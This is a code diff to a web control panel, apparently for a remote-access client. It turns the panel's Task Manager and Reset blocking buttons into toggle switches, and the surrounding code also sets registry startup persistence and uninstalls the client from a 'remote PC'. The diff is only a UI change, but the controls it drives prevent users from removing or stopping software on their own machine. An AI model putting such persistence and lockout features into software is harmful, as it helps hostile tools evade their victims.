@@ -52,6 +52,12 @@ body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-s
 .btn-sm{padding:.2rem.45rem;font-size:.68rem}
 .btn-xs{padding:2px 4px;font-size:.55rem;border-radius:3px;background:rgba(255,255,255,.05);border:1px solid var(--border);color:var(--text2);cursor:pointer;transition:all .12s}
 .btn-xs:hover{background:rgba(255,255,255,.1);color:var(--text)}
+.toggle{position:relative;width:36px;height:20px;flex-shrink:0;display:inline-block}
+.toggle input{opacity:0;width:0;height:0}
+.toggle .sl{position:absolute;inset:0;background:rgba(255,255,255,.08);border-radius:10px;cursor:pointer;transition:all .3s}
+.toggle .sl::before{content:'';position:absolute;width:14px;height:14px;left:3px;bottom:3px;background:rgba(255,255,255,.2);border-radius:50%;transition:all .3s}
+.toggle input:checked+.sl{background:rgba(34,197,94,.2)}
+.toggle input:checked+.sl::before{transform:translateX(16px);background:var(--green);box-shadow:0 2px 8px rgba(34,197,94,.3)}
 .bar{display:flex;gap:.35rem;margin-bottom:.5rem;flex-wrap:wrap;align-items:center;padding:.35rem.6rem;background:var(--surface);border:1px solid var(--border);border-radius:7px}
 .bar .lb{color:var(--text2);font-size:.65rem;font-weight:500;text-transform:uppercase;letter-spacing:.03em}
 .bar .sp{color:var(--border)}
@@ -339,12 +345,12 @@ body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-s
           </div>
           <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
             <span style="font-size:.7rem;min-width:55px;color:var(--text2)">Taskmgr</span>
-            <button class="btn btn-g btn-sm" id="setTaskmgrBtn" onclick="toggleTaskmgr()">...</button>
+            <label class="toggle"><input type="checkbox" id="setTaskmgrChk" onchange="toggleTaskmgr()"><span class="sl"></span></label>
             <span id="setTaskmgrTxt" style="font-size:.65rem;color:var(--text2)">...</span>
           </div>
           <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
             <span style="font-size:.7rem;min-width:55px;color:var(--text2)">Reset</span>
-            <button class="btn btn-g btn-sm" id="setResetBtn" onclick="toggleReset()">...</button>
+            <label class="toggle"><input type="checkbox" id="setResetChk" onchange="toggleReset()"><span class="sl"></span></label>
             <span id="setResetTxt" style="font-size:.65rem;color:var(--text2)">...</span>
           </div>
           <div id="setErr" class="err" style="margin-top:4px"></div>
@@ -550,26 +556,20 @@ async function toggleStartup(){
   if(r&&r.result){try{const d=JSON.parse(r.result);const b=document.getElementById('setStartupBtn');const t=document.getElementById('setStartupTxt');if(d.enabled){b.textContent='ON';b.className='btn btn-p btn-sm';t.textContent=d.active?'Running':'Registry set';t.style.color=d.active?'var(--green)':'var(--orange)'}else{b.textContent='OFF';b.className='btn btn-g btn-sm';t.textContent='Not in startup';t.style.color='var(--text2)'}}catch{}}
 }
 async function toggleTaskmgr(){
-  const btn=document.getElementById('setTaskmgrBtn');
-  const isOn=btn.textContent==='ON';
-  const r=await saw(isOn?'taskmgr_off':'taskmgr_on','','setErr','setErr');
+  const chk=document.getElementById('setTaskmgrChk');
+  const r=await saw(chk.checked?'taskmgr_on':'taskmgr_off','','setErr','setErr');
   if(r&&r.result==='ok'){
-    btn.textContent=isOn?'OFF':'ON';
-    btn.className=isOn?'btn btn-g btn-sm':'btn btn-p btn-sm';
-    document.getElementById('setTaskmgrTxt').textContent=isOn?'Unblocked':'Blocked';
-    document.getElementById('setTaskmgrTxt').style.color=isOn?'var(--text2)':'var(--orange)';
-  }
+    document.getElementById('setTaskmgrTxt').textContent=chk.checked?'Blocked':'Unblocked';
+    document.getElementById('setTaskmgrTxt').style.color=chk.checked?'var(--orange)':'var(--text2)';
+  } else { chk.checked=!chk.checked; }
 }
 async function toggleReset(){
-  const btn=document.getElementById('setResetBtn');
-  const isOn=btn.textContent==='ON';
-  const r=await saw(isOn?'reset_off':'reset_on','','setErr','setErr');
+  const chk=document.getElementById('setResetChk');
+  const r=await saw(chk.checked?'reset_on':'reset_off','','setErr','setErr');
   if(r&&r.result==='ok'){
-    btn.textContent=isOn?'OFF':'ON';
-    btn.className=isOn?'btn btn-g btn-sm':'btn btn-p btn-sm';
-    document.getElementById('setResetTxt').textContent=isOn?'Unblocked':'Blocked';
-    document.getElementById('setResetTxt').style.color=isOn?'var(--text2)':'var(--orange)';
-  }
+    document.getElementById('setResetTxt').textContent=chk.checked?'Blocked':'Unblocked';
+    document.getElementById('setResetTxt').style.color=chk.checked?'var(--orange)':'var(--text2)';
+  } else { chk.checked=!chk.checked; }
 }
 async function uninstallClient(){
   if(!confirm('UNINSTALL: Remove the client from remote PC?'))return;
